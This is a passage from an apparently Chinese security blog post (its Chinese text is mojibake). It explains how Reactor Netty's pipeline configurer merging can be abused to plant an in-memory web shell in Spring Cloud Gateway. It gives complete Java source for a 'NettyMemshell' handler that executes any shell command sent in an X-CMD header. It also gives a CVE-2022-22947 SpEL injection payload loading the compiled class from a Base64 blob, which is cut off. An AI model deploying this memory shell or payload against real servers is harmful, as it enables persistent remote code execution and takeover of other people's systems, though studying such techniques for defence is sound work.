class="hljs-keyword">class</span> <span class="hljs-title class_">ReactorNetty</span> &#123;<br>    ...<br>    <span class="hljs-comment">//å°†å¤šä¸ª ChannelPipelineConfigurer ç»„åˆåœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ª â€œç»„åˆé…ç½®å™¨â€</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CompositeChannelPipelineConfigurer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ChannelPipelineConfigurer</span> &#123;<br>        ...<br>        <span class="hljs-comment">//è¿™æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œç”¨äºæŠŠä¸¤ä¸ª ChannelPipelineConfigurer åˆå¹¶æˆä¸€ä¸ªã€‚è¿”å›å€¼ç±»å‹æ˜¯ ChannelPipelineConfigurerï¼Œå¦‚æœä¸¤ä¸ªéƒ½æ˜¯éç©ºç»„åˆï¼Œåˆ™è¿”å›ä¸€ä¸ªæ–°çš„ CompositeChannelPipelineConfigurerã€‚</span><br>        <span class="hljs-keyword">static</span> ChannelPipelineConfigurer <span class="hljs-title function_">compositeChannelPipelineConfigurer</span><span class="hljs-params">(</span><br><span class="hljs-params">				ChannelPipelineConfigurer configurer, ChannelPipelineConfigurer other)</span> &#123;<br><br>            <span class="hljs-comment">//å¦‚æœå…¶ä¸­ä¸€ä¸ªæ˜¯ç©ºé…ç½®ï¼ˆemptyConfigurer()ï¼‰ï¼Œç›´æ¥è¿”å›å¦ä¸€ä¸ªå³å¯ã€‚</span><br>            <span class="hljs-comment">//é¿å…åˆ›å»ºå†—ä½™çš„ç»„åˆå¯¹è±¡ï¼Œæé«˜æ€§èƒ½ã€‚</span><br>			<span class="hljs-keyword">if</span> (configurer == ChannelPipelineConfigurer.emptyConfigurer()) &#123;<br>				<span class="hljs-keyword">return</span> other;<br>			&#125;<br><br>			<span class="hljs-keyword">if</span> (other == ChannelPipelineConfigurer.emptyConfigurer()) &#123;<br>				<span class="hljs-keyword">return</span> configurer;<br>			&#125;<br><br>            <span class="hljs-comment">//newConfigurersï¼šæœ€ç»ˆåˆå¹¶åçš„é…ç½®å™¨æ•°ç»„ã€‚</span><br>			<span class="hljs-keyword">final</span> ChannelPipelineConfigurer[] newConfigurers;<br>            <span class="hljs-comment">//thizConfigurersï¼šå¦‚æœ configurer æœ¬èº«å°±æ˜¯ä¸€ä¸ªCompositeChannelPipelineConfigurerï¼Œåˆ™ä¿å­˜å®ƒå†…éƒ¨çš„æ‰€æœ‰é…ç½®å™¨ã€‚</span><br>			<span class="hljs-keyword">final</span> ChannelPipelineConfigurer[] thizConfigurers;<br>            <span class="hljs-comment">//åŒç†</span><br>			<span class="hljs-keyword">final</span> ChannelPipelineConfigurer[] otherConfigurers;<br>            <span class="hljs-comment">//åˆå§‹é•¿åº¦ length = 2ï¼Œå› ä¸ºè‡³å°‘è¦å­˜æ”¾ configurer å’Œ otherã€‚</span><br>			<span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br><br>            <span class="hljs-comment">//å¦‚æœ configurer å·²ç»æ˜¯ç»„åˆç±»å‹ï¼šå–å‡ºå®ƒå†…éƒ¨çš„é…ç½®å™¨æ•°ç»„ thizConfigurersï¼›é•¿åº¦å¢åŠ  thizConfigurers.length - 1</span><br>			<span class="hljs-keyword">if</span> (configurer <span class="hljs-keyword">instanceof</span> CompositeChannelPipelineConfigurer) &#123;<br>				thizConfigurers = ((CompositeChannelPipelineConfigurer) configurer).configurers;<br>				length += thizConfigurers.length - <span class="hljs-number">1</span>;<br>			&#125;<br>			<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//å¦åˆ™ç½®ä¸º nullã€‚</span><br>				thizConfigurers = <span class="hljs-literal">null</span>;<br>			&#125;<br><br>            <span class="hljs-comment">//å¯¹ other ä¹ŸåšåŒæ ·çš„å¤„ç†ã€‚</span><br>			<span class="hljs-keyword">if</span> (other <span class="hljs-keyword">instanceof</span> CompositeChannelPipelineConfigurer) &#123;<br>				otherConfigurers = ((CompositeChannelPipelineConfigurer) other).configurers;<br>				length += otherConfigurers.length - <span class="hljs-number">1</span>;<br>			&#125;<br>			<span class="hljs-keyword">else</span> &#123;<br>				otherConfigurers = <span class="hljs-literal">null</span>;<br>			&#125;<br><br>            <span class="hljs-comment">//æ ¹æ®è®¡ç®—å¥½çš„é•¿åº¦åˆ›å»ºæœ€ç»ˆæ•°ç»„ï¼Œç”¨äºå­˜æ”¾åˆå¹¶åçš„æ‰€æœ‰é…ç½®å™¨ã€‚</span><br>			newConfigurers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelPipelineConfigurer</span>[length];<br><br>            <span class="hljs-comment">//å¦‚æœ configurer æœ¬èº«æ˜¯ç»„åˆç±»å‹ï¼ŒæŠŠå®ƒå†…éƒ¨çš„é…ç½®å™¨å¤åˆ¶åˆ°æ–°æ•°ç»„å¼€å¤´ã€‚</span><br>			<span class="hljs-type">int</span> pos;<br>			<span class="hljs-keyword">if</span> (thizConfigurers != <span class="hljs-literal">null</span>) &#123;<br>				pos = thizConfigurers.length;<br>				System.arraycopy(thizConfigurers, <span class="hljs-number">0</span>, newConfigurers, <span class="hljs-number">0</span>, pos);<br>			&#125;<br>                <span class="hljs-comment">//å¦åˆ™ï¼Œç›´æ¥æŠŠ configurer æ”¾åˆ°æ•°ç»„ç¬¬ä¸€ä¸ªä½ç½®ã€‚</span><br>			<span class="hljs-keyword">else</span> &#123;<br>				pos = <span class="hljs-number">1</span>;<br>				newConfigurers[<span class="hljs-number">0</span>] = configurer;<br>			&#125;<br><br>			<span class="hljs-keyword">if</span> (otherConfigurers != <span class="hljs-literal">null</span>) &#123;<br>				System.arraycopy(otherConfigurers, <span class="hljs-number">0</span>, newConfigurers, pos, otherConfigurers.length);<br>			&#125;<br>			<span class="hljs-keyword">else</span> &#123;<br>				newConfigurers[pos] = other;<br>			&#125;<br><br>            <span class="hljs-comment">//ç”¨åˆå¹¶åçš„æ•°ç»„åˆ›å»ºä¸€ä¸ªæ–°çš„ CompositeChannelPipelineConfigurer</span><br>            <span class="hljs-comment">//æœ€ç»ˆæ•ˆæœæ˜¯æŠŠä¸¤ä¸ªé…ç½®å™¨ï¼ˆæˆ–ç»„åˆé…ç½®å™¨ï¼‰å¹³é“ºåˆå¹¶æˆä¸€ä¸ªå•ä¸€çš„ç»„åˆå¯¹è±¡</span><br>			<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompositeChannelPipelineConfigurer</span>(newConfigurers);<br>		&#125;<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>CompositeChannelPipelineConfigurer</strong> çš„å®ç°åŸç†ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CompositeChannelPipelineConfigurer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ChannelPipelineConfigurer</span> &#123;<br><br>       <span class="hljs-comment">//ä¿å­˜æ‰€æœ‰è¢«ç»„åˆçš„é…ç½®å™¨</span><br>	<span class="hljs-keyword">final</span> ChannelPipelineConfigurer[] configurers;<br><br>       <span class="hljs-comment">//æ„é€ æ–¹æ³•æ¥æ”¶ä¸€ä¸ªé…ç½®å™¨æ•°ç»„å¹¶èµ‹å€¼ç»™æˆå‘˜å˜é‡</span><br>       <span class="hljs-comment">//è¿™ä¸ªæ•°ç»„é€šå¸¸æ˜¯é€šè¿‡ä¹‹å‰æˆ‘ä»¬åˆ†æçš„ compositeChannelPipelineConfigurer() æ–¹æ³•ç”Ÿæˆçš„</span><br>       <span class="hljs-comment">//ä¿è¯ç»„åˆå™¨ä¸€æ—¦åˆ›å»ºå°±ä¸å¯å˜ï¼ˆfinal ä¿®é¥°ï¼‰</span><br>	CompositeChannelPipelineConfigurer(ChannelPipelineConfigurer[] configurers) &#123;<br>		<span class="hljs-built_in">this</span>.configurers = configurers;<br>	&#125;<br><br>	<span class="hljs-meta">@Override</span><br>       <span class="hljs-comment">//onChannelInit å¯¹ä¼ å…¥çš„ Channel è¿›è¡Œåˆå§‹åŒ–ï¼Œä¾æ¬¡ç»™ ChannelPipeline æ·»åŠ  handler</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onChannelInit</span><span class="hljs-params">(ConnectionObserver connectionObserver, Channel channel, <span class="hljs-meta">@Nullable</span> SocketAddress remoteAddress)</span> &#123;<br>		<span class="hljs-comment">// å¾ªç¯è°ƒç”¨æ‰€æœ‰ configurer å¯¹ pipeline è®¾ç½® handler</span><br>           <span class="hljs-keyword">for</span> (ChannelPipelineConfigurer configurer : configurers) &#123;<br>			configurer.onChannelInit(connectionObserver, channel, remoteAddress);<br>		&#125;<br>	&#125;<br></code></pre></td></tr></table></figure>



<p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ other å‚æ•°ä¸ºè‡ªå·±çš„ configurer å‘ pipeline ä¸­æ·»åŠ å†…å­˜é©¬ã€‚ç¿»é˜…æºç å‘ç° reactor.netty.transport.TransportConfig ç±»çš„ doOnChannelInit å±æ€§å­˜å‚¨ç€ other å‚æ•°ï¼Œ</p>
<p>ä½¿ç”¨ <a target="_blank" rel="noopener" href="https://github.com/c0ny1/java-object-searcher">java-object-searcher</a> ä»¥ doOnChannelInit ä¸ºå…³é”®å­—ï¼Œå®šä½å‡º doOnChannelInit åœ¨çº¿ç¨‹å¯¹è±¡çš„ä½ç½®:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">TargetObject = &#123;[Ljava.lang.Thread;&#125; <br>   ---&gt; [3] = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer$1&#125; = &#123;org.springframework.boot.web.embedded.netty.NettyWebServer$1&#125; <br>    ---&gt; val$disposableServer = &#123;reactor.netty.transport.ServerTransport$InetDisposableBind&#125; <br>     ---&gt; config = &#123;reactor.netty.http.server.HttpServerConfig&#125; <br>        ---&gt; doOnChannelInit = &#123;reactor.netty.ReactorNetty$$Lambda$391/236567414&#125;<br></code></pre></td></tr></table></figure>




<p><strong>æ”»å‡»æ€è·¯:</strong> å¦‚æœæˆ‘ä»¬æŠŠ <strong>other å‚æ•°è®¾ç½®æˆéç©ºé…ç½®</strong>ï¼ˆæ¯”å¦‚è‡ªå·±çš„ handler é…ç½®ï¼‰ï¼šæ–¹æ³•ä¼šæŠŠ <code>configurer</code> + <code>other</code> åˆå¹¶æˆä¸€ä¸ªæ–°çš„ <code>CompositeChannelPipelineConfigurer</code>è¿™ä¸ª composite configurer çš„ <code>onChannelInit</code> ä¼š <strong>å¾ªç¯è°ƒç”¨æ‰€æœ‰åˆå¹¶çš„ configurer</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼šå…ˆæ‰§è¡Œé»˜è®¤ handler é…ç½®ï¼Œå†æ‰§è¡Œæ¶æ„ handler é…ç½®ã€‚</p>
<p>è¿™æ ·å°±å®ç°äº† <strong>å†…å­˜é©¬æ¤å…¥ pipeline</strong>ï¼Œæ¯æ¡ pipeline éƒ½ä¼šè‡ªåŠ¨åŒ…å«ä½ çš„ handlerã€‚</p>
<p><strong>æ€»ç»“ä¸€ä¸‹ï¼š</strong></p>
<ol>
<li><strong>CompositeChannelPipelineConfigurer</strong> æ˜¯ <strong>pipeline configurer åˆå¹¶å™¨</strong></li>
<li>é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿”å›çš„æ˜¯ <strong>Spring Cloud Gateway é»˜è®¤ configurer</strong></li>
<li>å¦‚æœèƒ½æ§åˆ¶ <strong>other å‚æ•°</strong>ï¼šå°±èƒ½æŠŠè‡ªå·±çš„ configurer åˆå¹¶è¿›å»ï¼Œåœ¨ pipeline åˆå§‹åŒ–æ—¶æ·»åŠ æ¶æ„ handler å®ç°å†…å­˜é©¬</li>
<li><strong>doOnChannelInit</strong> æ˜¯ pipeline åˆå§‹åŒ–é’©å­çš„å­˜å‚¨ç‚¹ï¼Œå¯ä»¥ç”¨å®ƒæ‰¾åˆ°çº¿ç¨‹å¯¹è±¡ -&gt; è¿›å…¥ Netty é…ç½® -&gt; æ›¿æ¢ &#x2F; æ³¨å…¥è‡ªå·±çš„ configurer</li>
</ol>
<p><strong>æ ¸å¿ƒæ€è·¯</strong>æ˜¯é€šè¿‡æ§åˆ¶ Spring Cloud Gateway çš„ <code>doOnChannelInit</code>ï¼ˆå³ other configurerï¼‰æ¥ç”Ÿæˆ composite configurerï¼Œä»è€Œåœ¨æ¯æ¡ pipeline ä¸Šæ³¨å…¥è‡ªå·±çš„ handlerï¼Œå®ç° Netty å†…å­˜é©¬ã€‚</p>
<h3 id="3-2-3-æœ€ç»ˆçš„å†…å­˜é©¬"><a href="#3-2-3-æœ€ç»ˆçš„å†…å­˜é©¬" class="headerlink" title="3.2.3 æœ€ç»ˆçš„å†…å­˜é©¬"></a>3.2.3 æœ€ç»ˆçš„å†…å­˜é©¬</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> io.netty.buffer.Unpooled;<br><span class="hljs-keyword">import</span> io.netty.channel.*;<br><span class="hljs-keyword">import</span> io.netty.handler.codec.http.*;<br><span class="hljs-keyword">import</span> io.netty.util.CharsetUtil;<br><span class="hljs-keyword">import</span> reactor.netty.ChannelPipelineConfigurer;<br><span class="hljs-keyword">import</span> reactor.netty.ConnectionObserver;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.SocketAddress;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NettyMemshell</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ChannelDuplexHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ChannelPipelineConfigurer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">doInject</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;inject-start&quot;</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Method</span> <span class="hljs-variable">getThreads</span> <span class="hljs-operator">=</span> Thread.class.getDeclaredMethod(<span class="hljs-string">&quot;getThreads&quot;</span>);<br>            getThreads.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">threads</span> <span class="hljs-operator">=</span> getThreads.invoke(<span class="hljs-literal">null</span>);<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; Array.getLength(threads); i++) &#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> Array.get(threads, i);<br>                <span class="hljs-keyword">if</span> (thread != <span class="hljs-literal">null</span> &amp;&amp; thread.getClass().getName().contains(<span class="hljs-string">&quot;NettyWebServer&quot;</span>)) &#123;<br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">_val$disposableServer</span> <span class="hljs-operator">=</span> thread.getClass().getDeclaredField(<span class="hljs-string">&quot;val$disposableServer&quot;</span>);<br>                    _val$disposableServer.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">val$disposableServer</span> <span class="hljs-operator">=</span> _val$disposableServer.get(thread);<br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">_config</span> <span class="hljs-operator">=</span> val$disposableServer.getClass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;config&quot;</span>);<br>                    _config.setAccessible(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> _config.get(val$disposableServer);<br>                    <span class="hljs-type">Field</span> <span class="hljs-variable">_doOnChannelInit</span> <span class="hljs-operator">=</span> config.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="hljs-string">&quot;doOnChannelInit&quot;</span>);<br>                    _doOnChannelInit.setAccessible(<span class="hljs-literal">true</span>);<br>                    _doOnChannelInit.set(config, <span class="hljs-keyword">new</span> <span class="hljs-title class_">NettyMemshell</span>());<br>                    msg = <span class="hljs-string">&quot;inject-success&quot;</span>;<br>                &#125;<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            msg = <span class="hljs-string">&quot;inject-error&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> msg;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-comment">// Step1. ä½œä¸ºä¸€ä¸ªChannelPipelineConfigurerç»™piplineæ³¨å†ŒHandler</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onChannelInit</span><span class="hljs-params">(ConnectionObserver connectionObserver, Channel channel, SocketAddress socketAddress)</span> &#123;<br>        <span class="hljs-type">ChannelPipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> channel.pipeline();<br>        <span class="hljs-comment">// å°†å†…å­˜é©¬çš„handleræ·»åŠ åˆ°springå±‚handlerçš„å‰é¢        </span><br>        pipeline.addBefore(<span class="hljs-string">&quot;reactor.left.httpTrafficHandler&quot;</span>,<span class="hljs-string">&quot;memshell_handler&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">NettyMemshell</span>());<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-comment">// Step2. ä½œä¸ºHandlerå¤„ç†è¯·æ±‚ï¼Œåœ¨æ­¤å®ç°å†…å­˜é©¬çš„åŠŸèƒ½é€»è¾‘</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead</span><span class="hljs-params">(ChannelHandlerContext ctx, Object msg)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">if</span>(msg <span class="hljs-keyword">instanceof</span> HttpRequest)&#123;<br>            <span class="hljs-type">HttpRequest</span> <span class="hljs-variable">httpRequest</span> <span class="hljs-operator">=</span> (HttpRequest)msg;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span>(httpRequest.headers().contains(<span class="hljs-string">&quot;X-CMD&quot;</span>)) &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> httpRequest.headers().get(<span class="hljs-string">&quot;X-CMD&quot;</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">execResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>).next();<br>                    <span class="hljs-comment">// è¿”å›æ‰§è¡Œç»“æœ</span><br>                    send(ctx, execResult, HttpResponseStatus.OK);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;<br>        ctx.fireChannelRead(msg);<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">send</span><span class="hljs-params">(ChannelHandlerContext ctx, String context, HttpResponseStatus status)</span> &#123;<br>        <span class="hljs-type">FullHttpResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultFullHttpResponse</span>(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));<br>        response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="hljs-string">&quot;text/plain; charset=UTF-8&quot;</span>);<br>        ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>





<h3 id="3-2-4-é€šè¿‡-CVE-2022-22947-çš„-SpEL-æ³¨å…¥å†…å­˜é©¬"><a href="#3-2-4-é€šè¿‡-CVE-2022-22947-çš„-SpEL-æ³¨å…¥å†…å­˜é©¬" class="headerlink" title="3.2.4 é€šè¿‡ CVE-2022-22947 çš„ SpEL æ³¨å…¥å†…å­˜é©¬"></a>3.2.4 é€šè¿‡ CVE-2022-22947 çš„ SpEL æ³¨å…¥å†…å­˜é©¬</h3><h4 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h4><p>éœ€è¦æŠŠä¸Šæ–¹çš„å†…å­˜é©¬ç¼–è¯‘ä¸º class æ–‡ä»¶ï¼Œåœ¨ç»è¿‡ Base64 ç¼–ç åï¼Œæ„å»ºå®Œæ•´çš„ payloadï¼š(ä¼ çš„æ—¶å€™è¦æŠŠæ¢è¡Œå»æ‰ï¼)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">#&#123;T(org.springframework.cglib.core.ReflectUtils).defineClass(<br>&#x27;NettyMemshell&#x27;,<br>     T(org.springframework.util.Base64Utils).decodeFromString(&#x27;yv66vgAAADQBDwoAPgB6CAB7BwB8CABTBwB9CgAFAH4KAFwAfwcAgAoAXACBCgCCAIMKAIIAhAoACACFCgAFAIYIAIcKAFsAiAgASwoABQCJCgCKAH8KAIoAiwoABQCMCABOCACNBwCOCgAXAHoKAIoAjwgAkAcAkQgAkgsAkwCUCACVCACWCwCXAJgHAJkLACEAmggAmwoAnACdCgCcAJ4HAJ8KAKAAoQoAoACiCgCjAKQKACYApQgApgoAJgCnCgAmAKgJAKkAqgoAFwCrCgAbAKwLAK0ArgcArwkAsACxCQCyALMKALQAtQoAMgC2CwC3AJoJALgAuQgAugoAnAC7CwCtALwJAL0AvgsAvwDABwDBBwDCAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABlMY29tL25ldHR5L05ldHR5TWVtc2hlbGw7AQAIZG9JbmplY3QBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAFV92YWwkZGlzcG9zYWJsZVNlcnZlcgEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABR2YWwkZGlzcG9zYWJsZVNlcnZlcgEAEkxqYXZhL2xhbmcvT2JqZWN0OwEAB19jb25maWcBAAZjb25maWcBABBfZG9PbkNoYW5uZWxJbml0AQAGdGhyZWFkAQABaQEAAUkBAApnZXRUaHJlYWRzAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAd0aHJlYWRzAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAA21zZwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEADVN0YWNrTWFwVGFibGUHAMMHAMQBAA1vbkNoYW5uZWxJbml0AQBXKExyZWFjdG9yL25ldHR5L0Nvbm5lY3Rpb25PYnNlcnZlcjtMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsO0xqYXZhL25ldC9Tb2NrZXRBZGRyZXNzOylWAQASY29ubmVjdGlvbk9ic2VydmVyAQAiTHJlYWN0b3IvbmV0dHkvQ29ubmVjdGlvbk9ic2VydmVyOwEAB2NoYW5uZWwBABpMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsOwEADXNvY2tldEFkZHJlc3MBABhMamF2YS9uZXQvU29ja2V0QWRkcmVzczsBAAhwaXBlbGluZQEAIkxpby9uZXR0eS9jaGFubmVsL0NoYW5uZWxQaXBlbGluZTsBABBNZXRob2RQYXJhbWV0ZXJzAQALY2hhbm5lbFJlYWQBAD0oTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0O0xqYXZhL2xhbmcvT2JqZWN0OylWAQADY21kAQAKZXhlY1Jlc3VsdAEAC2h0dHBSZXF1ZXN0AQApTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVxdWVzdDsBAANjdHgBAChMaW8vbmV0dHkvY2hhbm5lbC9DaGFubmVsSGFuZGxlckNvbnRleHQ7AQAKRXhjZXB0aW9ucwEABHNlbmQBAG0oTGlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbEhhbmRsZXJDb250ZXh0O0xqYXZhL2xhbmcvU3RyaW5nO0xpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlc3BvbnNlU3RhdHVzOylWAQAHY29udGV4dAEABnN0YXR1cwEAMExpby9uZXR0eS9oYW5kbGVyL2NvZGVjL2h0dHAvSHR0cFJlc3BvbnNlU3RhdHVzOwEACHJlc3BvbnNlAQAuTGlvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9GdWxsSHR0cFJlc3BvbnNlOwEAClNvdXJjZUZpbGUBABJOZXR0eU1lbXNoZWxsLmphdmEMAEAAQQEADGluamVjdC1zdGFydAEAEGphdmEvbGFuZy9UaHJlYWQBAA9qYXZhL2xhbmcvQ2xhc3MMAMUAxgwAxwDIAQAQamF2YS9sYW5nL09iamVjdAwAyQDKBwDLDADMAM0MAM4AzwwA0ADRDADSAEgBAA5OZXR0eVdlYlNlcnZlcgwA0wDUDADVANYHANcMAM4A2AwA2QDRAQAPZG9PbkNoYW5uZWxJbml0AQAXY29tL25ldHR5L05ldHR5TWVtc2hlbGwMANoA2wEADmluamVjdC1zdWNjZXNzAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEADGluamVjdC1lcnJvcgcA3AwAZQDdAQAfcmVhY3Rvci5sZWZ0Lmh0dHBUcmFmZmljSGFuZGxlcgEAEG1lbXNoZWxsX2hhbmRsZXIHAN4MAN8A4AEAJ2lvL25ldHR5L2hhbmRsZXIvY29kZWMvaHR0cC9IdHRwUmVxdWVzdAwA4QDiAQAFWC1DTUQHAOMMANMA5AwAzgDlAQARamF2YS91dGlsL1NjYW5uZXIHAOYMAOcA6AwA6QDqBwDrDADsAO0MAEAA7gEAAlxBDADvAPAMAPEASAcA8gwA8wB1DABxAHIMAPQAQQcA9QwA9gD3AQAzaW8vbmV0dHkvaGFuZGxlci9jb2RlYy9odHRwL0RlZmF1bHRGdWxsSHR0cFJlc3BvbnNlBwD4DAD5APoHAPsMAPwA/QcA/gwA/wEADABAAQEHAQIHAQMMAQQBBQEAGXRleHQvcGxhaW47IGNoYXJzZXQ9VVRGLTgMANoBBgwBBwEIBwEJDAEKAQsHAQwMAQ0BDgEAJWlvL25ldHR5L2NoYW5uZWwvQ2hhbm5lbER1cGxleEhhbmRsZXIBACdyZWFjdG9yL25ldHR5L0NoYW5uZWxQaXBlbGluZUNvbmZpZ3VyZXIBABBqYXZhL2xhbmcvU3RyaW5nA